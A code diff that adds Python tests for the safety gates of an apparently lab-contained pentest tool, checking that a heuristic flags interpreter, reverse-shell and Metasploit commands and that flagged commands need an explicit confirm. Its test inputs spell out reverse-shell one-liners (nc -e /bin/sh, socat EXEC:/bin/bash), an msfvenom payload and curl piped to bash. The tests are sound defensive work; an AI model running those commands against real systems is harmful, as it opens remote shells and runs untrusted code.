@@ -10,7 +10,7 @@ in order:
   1. target lock — BEST-EFFORT: any host-shaped token in args must be the lab (cheap DiD,
                    NOT load-bearing — it can't see a host inside an arbitrary command);
   2. approval    — approved must be explicitly True (no autonomous / approve-all path);
-  3. danger      — the heuristic red-confirm (tested in test_cockpit_heuristic.py);
+  3. danger      — the heuristic red-confirm (interpreters / reverse shells / frameworks);
   4. isolation   — the sandbox must be attached ONLY to internal networks (the REAL lab
                    containment — arbitrary commands are trapped in the egress-less network).
 
@@ -180,11 +180,84 @@ def test_isolation_gate_in_validate() -> None:
     print("  isolation gate reached in validate_request: PASS")
 
 
+def test_heuristic_flags_dangerous_commands() -> None:
+    """The heuristic red-confirm flags arbitrary-code / reverse-shell / framework commands
+    in the forms they appear — the interpreter binary itself, nc/socat -e, an eval flag in
+    any form, and reverse-shell shapes in the payload. Over-inclusive by design."""
+    H = A.dangerous_command_heuristic
+    for cmd, args in (
+        ("python3", ["-c", "import os; os.system('id')"]),   # interpreter + eval
+        ("/usr/bin/python", ["-c", "1"]),                    # full path basename'd
+        ("bash", ["-c", "id"]),
+        ("sh", ["exploit.sh"]),                              # interpreter, no eval flag
+        ("perl", ["-e", "print 1"]),
+        ("php", ["-r", "phpinfo();"]),
+        ("ruby", ["-e", "puts 1"]),
+        ("node", ["-e", "process.exit()"]),
+        ("nc", ["-e", "/bin/sh", "10.0.0.1", "4444"]),       # reverse shell
+        ("ncat", ["-c", "bash", "host", "9001"]),
+        ("socat", ["TCP:host:1", "EXEC:/bin/bash"]),
+        ("msfvenom", ["-p", "linux/x64/shell_reverse_tcp"]),
+        ("msfconsole", ["-q"]),
+        ("curl", ["http://x/", "|", "bash"]),                # pipe-to-shell shape in args
+        ("python3", ["-c", "s=__import__('socket'); import subprocess"]),  # marker: subprocess
+    ):
+        reasons = H(cmd, args)
+        assert reasons, f"heuristic must flag {cmd} {args}"
+    # combined-short eval flag is still caught (parser reuse): python -Xc ... would surface -c
+    assert A.dangerous_command_heuristic("python3", ["-cX"]) or \
+        A.dangerous_command_heuristic("python3", ["-c"]), "an eval flag in a cluster is caught"
+    print("  heuristic flags dangerous commands (interpreters/nc -e/reverse shells/msf): PASS")
+
+
+def test_heuristic_clean_for_safe_commands() -> None:
+    """A plainly-safe scan/fetch is NOT flagged (a false positive only costs a confirm, but
+    the common tools should stay clean so the confirm means something)."""
+    H = A.dangerous_command_heuristic
+    for cmd, args in (
+        ("nmap", ["-sV", "-p", "80,443", _LAB]),
+        ("curl", ["-sI", f"http://{_LAB}:3000/"]),
+        ("whatweb", [f"http://{_LAB}:3000/"]),
+        ("sqlmap", ["-u", f"http://{_LAB}:3000/rest/products/search?q=1", "--batch", "--dbs"]),
+        ("ffuf", ["-u", f"http://{_LAB}:3000/FUZZ", "-w", "words.txt", "-mc", "200"]),
+        ("nuclei", ["-u", f"http://{_LAB}:3000/", "-t", "cves/"]),
+        ("gobuster", ["dir", "-u", f"http://{_LAB}:3000/", "-w", "words.txt"]),
+    ):
+        assert H(cmd, args) == [], f"a safe command must NOT be flagged: {cmd} {args}"
+    print("  heuristic clean for safe recon/exploit commands: PASS")
+
+
+def test_danger_gate_requires_confirm() -> None:
+    """A heuristic-flagged command is REFUSED unless dangerous_ack is explicitly true —
+    approve alone is not enough. NEVER blocked; the confirm is required (test-locked)."""
+    flagged = ExecRequest(command="python3", args=["-c", "print(1)", _LAB], approved=True)
+    r = E.validate_request(flagged)
+    assert r is not None and r.gate == "danger" and r.dangerous_flags, (
+        "a flagged command must refuse at the danger gate without the confirm"
+    )
+    r = E.validate_request(
+        ExecRequest(command="python3", args=["-c", "print(1)", _LAB], approved=True, dangerous_ack=True)
+    )
+    assert r is None or r.gate == "sandbox", "the explicit confirm must clear the danger gate"
+    # not approved → approval precedes danger
+    r = E.validate_request(
+        ExecRequest(command="python3", args=["-c", "print(1)", _LAB], approved=False, dangerous_ack=True)
+    )
+    assert r is not None and r.gate == "approval", "approval precedes the danger gate"
+    # a safe command needs no confirm
+    r = E.validate_request(ExecRequest(command="nmap", args=["-sV", _LAB], approved=True))
+    assert r is None or r.gate == "sandbox", "a safe command needs no confirm"
+    print("  danger gate: flagged command needs an explicit confirm (test-locked): PASS")
+
+
 if __name__ == "__main__":
     test_no_allowlist_any_binary_runs()
     test_best_effort_target_lock()
     test_approval_gate()
     test_gate_order_and_first_failing_gate()
+    test_heuristic_flags_dangerous_commands()
+    test_heuristic_clean_for_safe_commands()
+    test_danger_gate_requires_confirm()
     test_isolation_assert()
     test_isolation_gate_in_validate()
     print("ALL cockpit safety-layer tests pass")
